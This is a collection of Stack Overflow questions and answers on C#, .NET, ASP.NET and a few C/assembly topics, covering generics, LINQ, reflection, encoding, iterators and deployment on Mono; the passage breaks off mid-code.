"<p>I am Encrypted using AES and passing in querystring, will Html.Encode convert all the characters properly such that calling Decode will result in the same string?</p>
","33708","","<p>HTML encoding is different from URL encoding. HTML encoding is used when you want to output a URL in an HTML document. It escapes HTML stuff. To output a URL in an HTML page you should first URL encode the values to generate a valid URL and then HTML encode it when you want to write it in an HTML page.</p>

<p>Use <code>HttpUtility.UrlEncode</code>. Alternatively, you could first convert the <code>byte[]</code> to base64 using <code>Convert.ToBase64String</code> and then encode it using <code>HttpUtility.UrlEncode</code>. It's likely to generate a shorter URL.</p>
"
"<p>I have the following code...</p>

<pre><code>Const ToAddress As String = username.Text &amp; ""@gmail.com""
</code></pre>

<p>which sets to ToAddress to be used in on my Net.Mail.MailMessage
that is to be created with the following constructor</p>

<p><code>Dim mm As New Net.Mail.MailMessage(username.Text, ToAddress</code>)</p>

<p>which takes in a string and a constant string. But I get an error here</p>

<pre><code>Const ToAddress As String = **username.Text** &amp; ""@gmail.com""
</code></pre>

<p>that says : constant expression required</p>
","33708","","<p>VB.NET and C# are not C. Constant modifier is just used for constants whose values are known at the time of compilation.</p>
"
"<p>Am new to this here is my T-SQL</p>

<pre><code>SELECT category.id, category.name,COUNT(job.id) AS countofjobs 
FROM category 
LEFT OUTER JOIN job ON category.id = job.categoryid AND job.active=1 
WHERE category.featured=1 
GROUP BY category.id, category.name
ORDER BY category.name
</code></pre>

<p>what will be the equivalent LINQ to SQL code? any help will be appreciated</p>

<p>Sorry I forgot to mention that there is no relationship database side, tables have no association at all defined in db, thats the main issue, this is really just sample sql to see how I can write Link to SQL for T-SQL that requires: Left outer join, Count of outer join table records and sorting</p>
","33708","","<pre><code>var result = dataContext.Categories
                  .Where(c =&gt; c.Featured)
                  .OrderBy(c =&gt; c.Name)
                  .Select(c =&gt; new { c.Id, 
                                     c.Name, 
                                     CountOfJobs = c.Jobs.Count(j =&gt; j.Active) };
</code></pre>

<p>Alternatively:</p>

<pre><code>var result = from c in dataContext.Categories
             where c.Featured
             orderby c.Name
             select new { c.Id, c.Name, CountOfJobs = c.Jobs.Count(j =&gt; j.Active) };
</code></pre>
"
"<p>To me, Intel syntax is much easier to read. If I go traipsing through assembly forest concentrating only on Intel syntax, will I miss anything? Is there any reason I would want to switch to AT&amp;T (outside of being able to read others' AT&amp;T assembly)? My first clue is that gdb uses AT&amp;T by default.</p>

<p>If this matters, my focus is only on any relation assembly and syntax may have to Linux/BSD and the C language.</p>

<p><strong>edit</strong> </p>

<p>Thank you to Zifre, Jacob B and Mehrdad. I wish I could choose all three answers, because they all contained great information, so I at least up-voted you all. Thank you for the information about the Linux kernel, the rest of the GNU tools, and the reassurance that it won't affect my learning in the long run. You all are great!</p>
","33708","","<p>The primary syntax for the GNU assembler (GAS) is AT&amp;T. Intel syntax is a relatively new addition to it. x86 assembly in the Linux kernel is in AT&amp;T syntax. In the Linux world, it's the common syntax. In the MS world, Intel syntax is more common.</p>

<p>Personally, I <strong>hate AT&amp;T syntax</strong>. There are plenty of free assemblers (NASM, YASM) along with GAS that support Intel syntax too, so there won't be any problems doing Intel syntax in Linux.</p>

<p>Beyond that, it's just a syntactic difference. The result of both will be the same x86 machine code.</p>
"
"<p>In C# can I cast a variable of type object to a variable of type T where T is defined in a Type variable?</p>
","33708","","<p>Putting boxing and unboxing aside for simplicity, there's no specific runtime action involved in casting along the inheritance hierarchy. It's mostly a compile time thing. Essentially, a cast tells the compiler to treat the value of the variable as another type.</p>

<p>What you could do after the cast? You don't know the type, so you wouldn't be able to call any methods on it. There wouldn't be any special thing you could do. Specifically, it can be useful only if you know the possible types at compile time, cast it manually and handle each case separately with <code>if</code> statements:</p>

<pre><code>if (type == typeof(int)) {
    int x = (int)obj;
    DoSomethingWithInt(x);
} else if (type == typeof(string)) {
    string s = (string)obj;
    DoSomethingWithString(s);
} // ...
</code></pre>
"
"<p>I am trying to create a class as such:</p>

<pre><code>class CLASS
{
public:
    //stuff
private:
    int x, y;
    char array[x][y];
};
</code></pre>

<p>Of course, it doesn't work until I change <code>int x, y;</code> to</p>

<pre><code>const static int x = 10, y = 10;
</code></pre>

<p>Which is impractical, because I am trying to read the values of x and y from a file.  So is there any way to initialize an array with non-contant values, or declare an array and declare its size on different statements? And I know this would probably require the creation of an array class, but I'm not sure where to start on this, and I don't want to create a 2D dynamic list when the array itself is not dynamic, just the size is not known at compile-time.</p>
","33708","","<p>You can't allocate or initialize a global or static array declaratively using non-constant values (compile-time). It's possible for local arrays though (C99 variable sized arrays, as their initializer essentially runs at runtime every time the function is executed).</p>

<p>For your situation, I suggest using a pointer instead of an array and create the actual array dynamically at runtime (using <code>new</code>):</p>

<pre><code>class CLASS
{
public:
    CLASS(int _x, int _y) : x(_x), y(_y) {
       array = new char*[x];
       for(int i = 0; i &lt; x; ++i)
           array[i] = new char[y];
    }
    ~CLASS() {
       for (int i = 0; i &lt; x; ++i)
           delete[] array[i];
       delete[] array;
    }
    //stuff
private:
    int x, y;
    char **array;
};
</code></pre>
"
"<p>I know VS2010 is coming out soon and that usually corresponds to a update of the express versions</p>

<p>does anyone know if they are going to make a separate F# express suite?</p>
","33708","","<p>You can install <a href=""http://www.microsoft.com/downloads/details.aspx?familyid=2e9a8c35-eb3d-43eb-9122-a5ec195cd7bb&amp;displaylang=en"" rel=""nofollow"">Visual Studio 2008 Shell</a> and install F# add-in on top of it (which makes it effectively free). I can't see a need for an express edition.</p>
"
"<p><code>List(Of T)</code> stores data indexed by integer
<code>Dictionary(Of String, T)</code> stores data indexed via string</p>

<p>Is there a type or generic or specialized something that would let me access an array of <code>T</code> by either an index or name?</p>
","33708","","<p>I think <a href=""http://msdn.microsoft.com/en-us/library/system.collections.specialized.ordereddictionary.aspx"" rel=""nofollow""><code>System.Collections.Specialized.OrderedDictionary</code></a> is what you're looking for.</p>
"
"<p>There are quite a few asp.net mvc code examples by different people at www.asp.net/mvc, based on your experience, what is the best code example, I mean, the example you can learn and follow mostly in your project.</p>
","33708","","<p>To get started with ASP.NET MVC, I suggest looking at the project template itself (which helps <strong>a lot</strong> at the beginning) first and then use the <a href=""http://weblogs.asp.net/scottgu/archive/2009/03/10/free-asp-net-mvc-ebook-tutorial.aspx"" rel=""nofollow"">NerdDinner tutorial by Scott Guthrie</a>.</p>

<p>To learn more, I don't really think tutorial style things will help. Personally I start digging into frameworks myself after the initial spark (the VS IntelliSense menu is a great help, by the way ;) )</p>
"
"<p>How can I obtain a raw access to the HD and know if that location is used or is a free space?
Just a piece of example, I can obtain a direct access simply with an open and a read on a disk device, the goal is knowing whether the, for example, 10.000 byte is used or not.</p>
","33708","","<p>You can just <code>open</code> the block device (for example, <code>/dev/sda</code>) and read the sectors manually. However, that won't tell tell you if it's empty or not directly. Being empty or not is a something defined at the filesystem abstraction level. File system data structures store that kind of data and you should have a deep understanding of the specific filesystem to do so from the raw blocks (without using any filesystem provided function).</p>
"
"<p>I have some html that is going to be in every page so i stuck it in a .cs file. This piece of html has a lot of quotes so i would prefer not to escape each of the (\""). It isnt hard to since i can use find/replace but i wanted to know. Is there a nice way to mix html and CS so i can easily generate the page?</p>
","33708","","<p>For the specific case of double quote, there's not a much better way. Generally, you can use verbatim strings. They will handle line breaks and all escape characters except <code>""</code> which should be replaced with <code>""""</code>:</p>

<pre><code>Response.Write(@""&lt;html&gt;
&lt;body&gt;
   &lt;h1 style=""""style1""""&gt;Hello world&lt;/h1&gt;
&lt;/body&gt;
&lt;/html&gt;"");
</code></pre>
"
"<p>Are there any good way to use the Conditional-attribute in the context of testing?</p>

<p>My thoughts were that if you can do this:</p>

<pre><code>[Conditional(""Debug"")]
public void DebugMethod()
{
    //...
}
</code></pre>

<p>Maybe you could have some use for: (?)</p>

<pre><code>[Conditional(""Test"")]
public void TestableMethod()
{
    //...
}
</code></pre>
","33708","","<p>I don't see a use when there's a better alternative: Test Projects.</p>

<p>Use NUnit or MSTest to achieve this functionality in a more graceful way.</p>
"
"<p>I've got a number of classes that inherit from <code>Item&lt;T&gt;</code>.</p>

<p>Each class has a Create() method that I would like to move up into <code>Item&lt;T&gt;</code>.</p>

<p>Yet the following code gets the error ""<strong>Cannot create an instance of the variable type 'T' because it does not have the new() constraint</strong>"":</p>

<pre><code>T item = new T(loadCode);
</code></pre>

<p>What is the <strong>correction syntax</strong> to do this?</p>

<pre><code>public abstract class Item&lt;T&gt; : ItemBase
{

    public static T Create(string loadCode)
    {
        T item = new T(loadCode);

        if (!item.IsEmpty())
        {
            return item;
        }
        else
        {
            throw new CannotInstantiateException();
        }
    }
</code></pre>
","33708","","<p>It's not possible. You can only use <code>new()</code> constraint to force existence of a constructor.</p>

<p>A workaround is to take a <code>Func&lt;InputType, T&gt;</code> (<code>Func&lt;string,T&gt;</code> in your example) delegate as input parameter that'll create the object for us.</p>

<pre><code>public static T Create(string loadCode, Func&lt;string,T&gt; construct)
{
    T item = construct(loadCode);

    if (!item.IsEmpty())
    {
        return item;
    }
    else
    {
        throw new CannotInstantiateException();
    }
}
</code></pre>

<p>and call it with: <code>Item&lt;T&gt;.Create(""test"", s =&gt; new T(s));</code></p>
"
"<p>Let's say I have a generic list of <code>Fruit</code> (<code>List&lt;Fruit&gt; fruits = new List&lt;Fruit&gt;()</code>). I then add a couple of objects (all derived from <code>Fruit</code>) - <code>Banana</code>, <code>Apple</code>, <code>Orange</code> but with different properties on the derived objects (such as <code>Banana.IsYellow</code>).</p>

<pre><code>List&lt;Fruit&gt; fruits = new List&lt;Fruit&gt;();
Banana banana1 = new Banana();
Banana banana2 = new Banana();
Apple apple1 = new Apple();
Orange orange2 = new Orange();

fruits.Add(banana1);
fruits.Add(banana2);
fruits.Add(apple1);
fruits.Add(orange1);
</code></pre>

<p>Then I can do this:</p>

<pre><code>foreach(Banana banana in fruits)
    Console.Write(banana.IsYellow);
</code></pre>

<p>But at execution time of course this is not valid because there is no <code>IsYellow</code>-property on the Apple and Orange objects.</p>

<p>How do I get only the bananas, apples, oranges etc from the <code>List&lt;Fruit&gt;</code>?</p>
","33708","","<pre><code>foreach(Banana b in fruits.OfType&lt;Banana&gt;())
</code></pre>
"
"<p>How can tell if my object's value is a float or int? </p>

<p>For example, I would like this to return me bool value.</p>
","33708","","<pre><code>if (value.GetType() == typeof(int)) {
    // ...
}
</code></pre>
"
"<p>For ""text/html"" the following works:
<code>
System.Net.Mime.MediaTypeNames.Text.Html
</code></p>
","33708","","<p>There isn't a built in constant in the current .NET Framework BCL. There are many MIME types that don't have a constant there.</p>
"
"<pre><code> public string GetNameBySSN(string SSN)
 {
    var results = from c in Clients
                  where c.ClientSSN.Equals(IRRCNumber)
                  select c.FirstName;
    //return results.ToString();
 }
</code></pre>

<p>I want to return a single column value with Linq and not sure if there is way to do a quick easy return. I commented section of code that I know does not return the value and if enumerate through collection I can get the value but wondering if a better way was around. </p>

<p>I do understand that Linq is Set based and that it has no upfront means know that the
result is set with a single member. </p>
","33708","","<pre><code>return results.First().ToString();
</code></pre>

<p>Other possible variants:</p>

<p><strong>.First()</strong> returns the first item and throws an exception if no item exists. It ignores all other items.</p>

<p><strong>.FirstOrDefault()</strong> returns the first item if exists and returns the default value of the result type if nothing exists. It ignores all other items.</p>

<p><strong>.Single()</strong> returns the only item if the collection contains <strong>exactly one</strong> item and throws an exception otherwise.</p>

<p><strong>.SingleOrDefault()</strong> is like <strong>.Single()</strong> but returns the default value of the result type instead of throwing an exception.</p>
"
"<p>I am thinking of the following design:</p>

<pre><code>static class AppVersion
{
     public static string BuildDate 
     {
       get; set;
     }
     public static string Version 
     {
       get; set;
     }
     public static string GetVersion 
     {
       get; set;
     }
}
</code></pre>

<p>A few questions on this:</p>

<ol>
<li>How can I get the build date?</li>
<li>How can I print a date in a nice format?</li>
<li>How can I obtain and print the Visual Studio version in a nice format?</li>
<li>It is probably a bad idea to hard code the version into the binary, so I put the version into assembly information. How can I programmatically get it? </li>
</ol>
","33708","","<p>I think your first questions are a matter of taste. You could use <a href=""http://msdn.microsoft.com/en-us/library/fht0f5be.aspx"" rel=""nofollow""><code>String.Format</code></a> to get any style you want. Regarding your last question:</p>

<pre><code>System.Reflection.Assembly.GetExecutingAssembly().Version
</code></pre>

<p>returns the version number of the current assembly and:</p>

<pre><code>typeof(SomeTypeInSomeAssembly).Assembly.Version
</code></pre>

<p>will return the version number of the assembly containing the specific type.</p>
"
"<p>I want to do the same as in <a href=""http://stackoverflow.com/questions/404231/using-an-enum-as-an-array-index"">this question</a>, that is:</p>

<pre><code>enum DaysOfTheWeek {Sunday=0, Monday, Tuesday...};
string[] message_array = new string[number_of_items_at_enum];

...

Console.Write(custom_array[(int)DaysOfTheWeek.Sunday]);
</code></pre>

<p>however, I would rather have something integral to so, rather than write this error prone code. Is there a built in module in C# that does just this?</p>
","33708","","<p>If the values of your enum items are contigious, the array method works pretty well. However, in any case, you could use <code>Dictionary&lt;DayOfTheWeek, string&gt;</code> (which is less performant, by the way).</p>
"
"<p>I am using (a slightly extended version of) the following code in a factory-pattern style function:</p>

<p><pre><code></p>

<p>public class SingleItemNew : CheckoutContext
   {
      public BookingContext Data { get; set; }
      public SingleItemNew(BookingContext data)
      {
        Data = data;
      }
   }
public CheckoutContext findContext(BookingContext data)
{
Type contextType = Type.GetType(""CheckoutProcesses."" + data.Case.ToString());
         CheckoutContext output =
            Activator.CreateInstance(contextType, BindingFlags.CreateInstance, new[] { data }) as CheckoutContext;
return output;
}</pre></code></p>

<p>however, it throws a constuctor not found exception when run, and I cannot figure out why.</p>

<p>The data.Case.ToString() method returns the name of a class, SingleItemNew, that has a constructor taking a single argument.</p>

<p>Does anyone have any idea what the problem is?</p>

<p>Cheers, Ed</p>
","33708","","<p>Try this one:</p>

<pre><code>  Type contextType = Type.GetType(""CheckoutProcesses."" + data.Case.ToString());
  CheckoutContext output = 
      (CheckoutContext)Activator.CreateInstance(contextType, data);
</code></pre>

<p>The reason you code doesn't work is that <code>Activator.CreateInstance</code> doesn't really have the overload you want. So you might wonder why the code compiles at all! The reason is, it has an overload that takes <code>(Type type, params object[] args)</code> which matches your method call so it compiles but at runtime, it searches your type for a constructor taking a <code>BindingFlags</code> and a <code>BookingContext[]</code> which is clearly not what your type has.</p>
"
"<p>I'm trying to determine if the MethodInfo object that I get from a GetMethod call on a type instance is implemented by the type or by it's base.</p>

<p>For example:</p>

<pre><code>Foo foo = new Foo();
MethodInfo methodInfo = foo.GetType().GetMethod(""ToString"",BindingFlags|Instance);
</code></pre>

<p>the ToString method may be implemented in the Foo class or not.  I want to know if I'm getting the foo implementation?</p>

<blockquote>
  <p><strong>Related question</strong>  </p>
  
  <p><a href=""http://stackoverflow.com/questions/839984/is-it-possible-to-tell-if-a-net-virtual-method-has-been-overriden-in-a-derived-c"">Is it possible to tell if a .NET virtual method has been overriden in a derived class?</a></p>
</blockquote>
","33708","","<p>Check its <code>DeclaringType</code> property.</p>

<pre><code>if (methodInfo.DeclaringType == typeof(Foo)) {
   // ...
}
</code></pre>
"
"<p>I was wondering what is the best way for getting the generic arguments that definine a dictionary at run time is.</p>

<p>Take for example:</p>

<pre><code>Dictionary&lt;string, object&gt; dict;
</code></pre>

<p>How at runtime can I find out that the keys are strings?</p>
","33708","","<p>I'm not sure if I understand your question correctly but I think you mean something like this:</p>

<pre><code>Dictionary&lt;string, object&gt; dict = new Dictionary&lt;string, object&gt;();
// ...
var args = dict.GetType().GetGenericArguments();
// args[0] will be typeof(string)
</code></pre>
"
"<p>I would like to perform a test if an object is of a generic type. I've tried the following without success: </p>

<pre><code>public bool Test()
{
    List&lt;int&gt; list = new List&lt;int&gt;();
    return list.GetType() == typeof(List&lt;&gt;);
}
</code></pre>

<p>What am I doing wrong and how do I perform this test?</p>
","33708","","<p>If you want to check if it's an instance of a generic type:</p>

<pre><code>return list.GetType().IsGenericType;
</code></pre>

<p>If you want to check if it's a generic <code>List&lt;T&gt;</code>:</p>

<pre><code>return list.GetType().GetGenericTypeDefinition() == typeof(List&lt;&gt;);
</code></pre>

<p>As Jon points out, this checks the exact type equivalence. Returning <code>false</code> doesn't necessarily mean <code>list is List&lt;T&gt;</code> returns <code>false</code> (i.e. the object cannot be assigned to a <code>List&lt;T&gt;</code> variable). </p>
"
"<p>We have a Microsoft.Win32 Namespace but is it guaranteed to work in 64-bit Windows environments? Is there an equivalent need to have such definitions for a 64-bit situation?</p>
","33708","","<p>For the same reason we have 64 bit binaries stored in the <code>system32</code> folder in 64-bit Windows.</p>

<p>Basically, that's because things in <code>Microsoft.Win32</code> are not specific to 32-bit Windows. Why should they harm portability without any benefits?</p>
"
"<p>I'm using .net 3.5. The problem here is that I cant seem to get the passwords to match. I have tried using the ComputeHash method on both, but it generates a different hash. As they are now the arrays are different sizes. (Obviously they are based on the same string). What have I done wrong? (""password"" is byte[] param by user input)</p>

<pre><code>object dataPassword = database.ExecuteScalar(""GetUserPassword"", new object[] {userName});
if(dataPassword != null &amp;&amp; !(dataPassword is DBNull))
{
    SHA1Managed hashProvider = new SHA1Managed();
	byte[] hashedPassword = (byte[])dataPassword;                    
    byte[] hash = hashProvider.ComputeHash(password);
    result = hashedPassword.Equals(hash);

}
</code></pre>
","33708","","<p>You can't compare a <code>byte[]</code> like that. It just compares references. You should use a loop or use <code>IEnumerable&lt;T&gt;.SequenceEqual</code> extension method:</p>

<pre><code>result = hashedPassword.SequenceEqual(hash);
</code></pre>

<p>Old way (pre-LINQ):</p>

<pre><code>static bool ArrayEquals&lt;T&gt;(T[] first, T[] second) {
    if (first == null &amp;&amp; second == null) return true;
    if (first == null || second == null) return false;
    if (first.Length != second.Length) return false;
    for (int i = 0; i &lt; first.Length; ++i)
       if (first[i] != second[i]) return false;
    return true;
}
</code></pre>
"
"<p>I know that this probably doesn't really matter, but I would like to know what is correct.</p>

<p>If a piece of code contains some version of <code>throw new SomeKindOfException()</code>. Do we say that this piece of code can potentially raise an exception? Or throw an exception?</p>

<p>The keyword is <code>throw</code>, so I am kind of leaning towards that, but to raise an exception is also used a lot...</p>

<p>Do they have some sort of different meaning? Does one of them sort of implicate a difference over the other? Or is it just two words meaning exactly the same thing?</p>
","33708","","<p>In C# terminology, <strong>raising</strong> is used in the context of events and <strong>throwing</strong> is used in the context of exceptions.</p>

<p>Personally, I think <code>throw/catch</code> combination is more beautiful than <code>raise/catch</code>.</p>
"
"<p>I am trying to use reflection to create object array of the type created from reflection like the folowing:</p>

<pre><code>Client[] newArray = new Client[] {client1, client2};
</code></pre>

<p>I need to somehow get the <code>Client</code> object type to create the object so it can be passed through.</p>

<p>Any help would be greatly appreciated.</p>

<p>Cheers,
Rob</p>

<pre><code>object clientObject = testAssembly.CreateInstance("".Testing_Automation.Client"");        
Type client = testAssembly.GetType("".Testing_Automation.Client"");

// Create Client Object Array
</code></pre>

<p>Passing to:</p>

<pre><code>public Appointment(IEnumerable&lt;Client&gt; client, string time)
</code></pre>
","33708","","<p>You should use <code>Array.CreateInstance</code> method:</p>

<pre><code>Array arr = Array.CreateInstance(client, lengthOfArray);
arr.SetValue(client1, 0); // Fill in the array...
arr.SetValue(client2, 1);
</code></pre>

<p>To get an <code>IEnumerable&lt;Client&gt;</code> from the array, you could use <code>(IEnumerable&lt;Client&gt;)arr</code> if you know the <code>Client</code> type at compile time. If you don't, which is likely, you should post more info about the possibilites of that method call.</p>
"
"<p>Apparently in Europe, <a href=""http://news.bbc.co.uk/1/hi/technology/8096701.stm"" rel=""nofollow"">Microsoft plan to ship Windows 7 without IE8 preinstalled</a>. Many of the commercial apps I have been a developer on have made use of IE in some way or other, so I am concerned about whether we need to now install IE8 as part of our application installs.</p>

<p>Does this mean that applications making use of...</p>

<ul>
<li>The WindowsForms WebBrowser component</li>
<li>The WPF WebBroswer control</li>
<li><a href=""http://msdn.microsoft.com/en-us/library/aa289511.aspx"" rel=""nofollow"">No touch deploy</a></li>
<li>IE as an ActiveX control</li>
<li>XPS Viewer</li>
<li>possibly other developer API's / COM components?</li>
</ul>

<p>...will no longer work out of the box on Win 7 in Europe? Or have MS found a sneaky way to leave core IE components in the OS, and just removed the ""browser"" application?</p>
","33708","","<p>While I have nothing to back what I'm saying, it's hard to believe that they've removed the whole MSHTML back-end components. Many apps are out there that are using it and they'll fail to run without it. I think they have just removed the browser application (just like what happens when you uncheck IE8 in Windows 7 Programs and Features).</p>
"
"<p>I have a business class that contains two nullable decimal properties. A third property returns the result of multiplying the other two properties. If HasValue is true for the two nullable types then I multiply and return the result. I have a few options for the return value if one or both of the properties is null:</p>

<ul>
<li>Return 0</li>
<li>Throw an exception</li>
<li>Return a magic number (-1)</li>
<li>Return decimal? (EDIT -- see comments)</li>
</ul>

<p>I thought one of my options would be to return NaN, but I see that this is only possible for the double type. Why is this?</p>

<p>For the record, returning 0 makes the most sense in this case and that's what I plan to do unless someone has a better suggestion.</p>
","33708","","<p>Integral types in .NET use two's complement system for representation. While they could reserve some bit patterns for special values, they chose not to. <code>double</code> and <code>float</code> use a completely different representation system (IEEE 754) which reserves some special bit patterns for NaN, +Infinity, -Infinity, ...</p>

<p>One reason that NaN and Infinity values make more sense for floating point arithmetic is that operations could result division by zero, not only because the divisor is actually zero, but because it's too small to be represented by the type. As a result, if that wasn't the case, you could have some valid calculation mysteriously throw a divide by zero exception. This won't happen for <code>int</code> types as they are exact and don't have a precision error.</p>

<p><code>decimal</code> is designed to be used for ""real-world"" decimal floating point numbers. It's rarely subject to calculations that <code>double</code> and <code>float</code> are designed to do. What would <code>NaN</code> express for a real world number?</p>

<p>Leaving reasons behind it alone, it is what it is and there's nothing we could do about it, so the best route to go is to use nullable types (they are designed to help with exactly this kind of situation). It's the <em>right way</em> to solve this problem. If you don't want to do that (and exceptions don't make sense), you should resort to the magic number solution. If you chose to do so, just make sure it's outside of the domain of valid results.</p>

<h3>EDIT (very common misconception about decimal):</h3>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.decimal.aspx"">As also noted by MSDN</a>, <code>decimal</code> is not fixed point. It is a floating point number:</p>

<blockquote>
  <p>A decimal number is a floating-point value that consists of a sign, a numeric value where each digit in the value ranges from 0 to 9, and a scaling factor that indicates the position of a floating decimal point that separates the integral and fractional parts of the numeric value. </p>
</blockquote>
"
"<p>As programmers we need to be precise with our verbal and written communication. Why do so many programmers confuse the term ""assembler"" (the object code generator) with ""assembly"" (the language you program in)?</p>

<p>The distinction is unambiguous. Could there be historical explanation?</p>
","33708","","<p>The reason it's sometimes called ""assembler language"" is that the assembler, as a program, understands that language.</p>

<p>For example, there are different assemblers generating x86 machine code. Their languages are different, so basically you are writing in say, GAS assembler's language.</p>
"
"<p>My department doesn't have a server to host web applications developed in ASP.NET. They do have RHEL boxes having Apache web server, which won't host my ASP.NET web pages. I inquired and they said they have mono which would run my .NET applications.</p>

<p>I created a simple web page and it worked on my windows laptop.</p>

<p>My question is what exactly should I copy to my home directory (has CGI environment) on the RHEL box. Copying dll's won't make sense, so should I copy the .aspx files?</p>

<p>I read a bit about it here <a href=""http://www.codeproject.com/KB/cross-platform/introtomono2.aspx"" rel=""nofollow"">http://www.codeproject.com/KB/cross-platform/introtomono2.aspx</a></p>

<p>They say just copy the .aspx files. In that case how does it all work? I mean does mono compile the .aspx files and makes it compatible for Apache to host them?</p>

<p>Does it have any flip sides like everything I develop in ASP.NET on windows can be shown on linux web server as it is using mono?</p>

<p>cheers</p>
","33708","","<p>If you are using the Website model, you should copy the whole directory contents (they'll be compiled at run time). If you are using the Web application model, you can skip copying <code>.cs</code> files (the <code>.cs</code> files will be compiled to <code>.dll</code> files in the <code>bin</code> folder beforehand). You should copy <code>bin</code> folder instead, along with all other <code>.aspx, .ascx, .asax, .config, ...</code> files.</p>
"
"<p>Will VS2008 be able to develop ASP.NET 4.0 applications when it is released?</p>

<p>I would hate to have to go buy VS2010 just for a couple of features I'm looking forward two like Dynamic Data and session profiles.</p>
","33708","","<p>You can develop .NET applications without Visual Studio at all, so you could use Visual Studio 2008 as a helpful tool in that regard but looking at the previous Visual Studio releases, it's very unlikely that you'll get first class support for .NET 4.0 features. Personally, I think the short answer to your question is ""No.""</p>

<p>By the way, ASP.NET Dynamic Data is already available in .NET Framework 3.5 SP1 and VS2008 supports it.</p>
"
"<p>I'm currently providing 32 bit Windows music software. Some of my users are asking for 64-bit support.  I plan to eventually, but porting is a big job, and I have plenty of other important feature requests too. I need to allocate my limited time wisely.
 How much market share do 64-bit operating systems hold?, and what's the trend.</p>
","33708","","<p>Music software is a bit vague. If you are developing music encoding/decoding software professionally, then 64 bit is something you should take seriously, since it can have noticeable impact on encoding/decoding performance.</p>

<p>Otherwise, while 64 bit is getting increasingly popular, your 32 bit app will still run perfectly so other features are more important in the meantime. However, you should think about 64 bit porting too and refactor your code to be more portable as you go forward.</p>
"
"<p>I'm trying to create a login system for my website, I've created a custom login.ascx and when the user clicks [ Login ] a div pops up with the contents of login.ascx.</p>

<p>Then after the user enters their credentials, they click on the Login button. They get validated and logged in using this code in the login click function:</p>

<pre><code>if( Membership.ValidateUser( userName.Text, password.Text ) )
{
    //Here is where I'm not sure what to do   
}
else
{
    LoginError.Visible = true;
}
</code></pre>

<p>So in the section where I'm not sure what to do, I would like the user to get logged in (Not sure if that means creating an authentication ticket or whatnot). What does is the next step to actually log the user in, I don't want them to get redirected anywhere since they are on the correct page already.</p>

<p>I would also like to be able to retrieve their user name or user id later on for use in my web services. So, for this should I do a Session.Add to create a new session value or is there some other way of storing the data that is preferred?</p>
","33708","","<p>There's no need to store it in <code>Session</code>. Just use:</p>

<pre><code>FormsAuthentication.SetAuthCookie
</code></pre>

<p>to send an authentication ticket to the client. Then use <code>HttpContext.Current.User.Identity</code> to retrieve it later.</p>
"
"<p>There is a piece of code:</p>

<pre><code>int p(char *a, char*b)
{
  while (*a | *b) 
  {
   if (*a ^ *b)
    //...
  }
}
</code></pre>

<p>and I don't really know what it's doing.</p>

<p>Edit: I understand what the <code>|</code> and <code>^</code> operators do, I just don't know what they'll do with <code>char</code> values.</p>
","33708","","<p><code>|</code> is the bitwise OR operator. <code>^</code> is the bitwise XOR operator:</p>

<pre><code>    10101010      11010101  
  | 01010100    ^ 11111110
  ==========    ==========
    11111110      00101011
</code></pre>

<p>While <code>char</code> can be used to represent characters, it's inherently an integer data type. It stores a binary number (just like everything else in a binary digital computer).</p>
"
"<p>I tried this earlier today:</p>

<pre><code>public interface IFoo
{
    IEnumerable&lt;int&gt; GetItems_A( ref int somethingElse );
    IEnumerable&lt;int&gt; GetItems_B( ref int somethingElse );
}


public class Bar : IFoo
{
    public IEnumerable&lt;int&gt; GetItems_A( ref int somethingElse )
    {
        // Ok...
    }

    public IEnumerable&lt;int&gt; GetItems_B( ref int somethingElse )
    {
        yield return 7; // CS1623: Iterators cannot have ref or out parameters            

    }
}
</code></pre>

<p>What's the rationale behind this? Thanks in advance.</p>
","33708","","<p>C# iterators are state machines internally. Every time you <code>yield return</code> something, the place where you left off should be saved along with the state of local variables so that you could get back and continue from there.</p>

<p>To hold this state, C# compiler creates a class to hold local variables and the place it should continue from. It's not possible to have a <code>ref</code> or <code>out</code> value as a field in a class. Consequently, if you were allowed to declare a parameter as <code>ref</code> or <code>out</code>, there would be no way to keep the complete snapshot of the function at the time we had left off.</p>

<p><strong>EDIT:</strong> Technically, not all methods that return <code>IEnumerable&lt;T&gt;</code> are considered iterators. Just those that use <code>yield</code> to produce a sequence directly are considered iterators. Therefore, while the splitting the iterator into two methods is a nice and common workaround, it doesn't contradict with what I just said. The outer method (that doesn't use <code>yield</code> directly) is <strong>not</strong> considered an iterator.</p>
"
"<p>Given an array: <code>[dog, cat, mouse]</code></p>

<p>what is the most elegant way to create:</p>

<pre><code>[,,]
[,,mouse]
[,cat,]
[,cat,mouse]
[dog,,]
[dog,,mouse]
[dog,cat,]
[dog,cat,mouse]
</code></pre>

<p>I need this to work for any sized array.</p>

<p>This is essentially a binary counter, where array indices represent bits. This presumably lets me use some bitwise operation to count, but I can't see a nice way of translating this to array indices though.</p>
","33708","","<pre><code>static IEnumerable&lt;IEnumerable&lt;T&gt;&gt; GetSubsets&lt;T&gt;(IList&lt;T&gt; set)
{
    var state = new BitArray(set.Count);
    do
        yield return Enumerable.Range(0, state.Count)
                               .Select(i =&gt; state[i] ? set[i] : default(T));
    while (Increment(state));
}

static bool Increment(BitArray flags)
{
    int x = flags.Count - 1; 
    while (x &gt;= 0 &amp;&amp; flags[x]) flags[x--] = false ;
    if (x &gt;= 0) flags[x] = true;
    return x &gt;= 0;
}
</code></pre>

<p>Usage:</p>

<pre><code>foreach(var strings in GetSubsets(new[] { ""dog"", ""cat"", ""mouse"" }))
    Console.WriteLine(string.Join("", "", strings.ToArray()));
</code></pre>
"
"<p>I have a Dictionary to map a certain type to a certain generic object for that type. For example:</p>

<pre><code>typeof(LoginMessage) maps to MessageProcessor&lt;LoginMessage&gt;
</code></pre>

<p>Now the problem is to retrieve this generic object at runtime from the Dictionary. Or to be more specific: To cast the retrieved object to the specific generic type.</p>

<p>I need it to work something like this:</p>

<pre><code>Type key = message.GetType();
MessageProcessor&lt;key&gt; processor = messageProcessors[key] as MessageProcessor&lt;key&gt;;
</code></pre>

<p>Hope there is a easy solution to this.</p>

<p>Edit:
I do not want to use Ifs and switches. Due to performance issues I cannot use reflection of some sort either.</p>
","33708","","<p>You can't do that. You could try telling your problem from a more high level point of view (i.e. what exactly do you want to accomplish with the casted variable) for a different solution.</p>

<p>You could go with something like this:</p>

<pre><code> public abstract class Message { 
     // ...
 }
 public class Message&lt;T&gt; : Message {
 }

 public abstract class MessageProcessor {
     public abstract void ProcessMessage(Message msg);
 }
 public class SayMessageProcessor : MessageProcessor {
     public override void ProcessMessage(Message msg) {
         ProcessMessage((Message&lt;Say&gt;)msg);
     }
     public void ProcessMessage(Message&lt;Say&gt; msg) {
         // do the actual processing
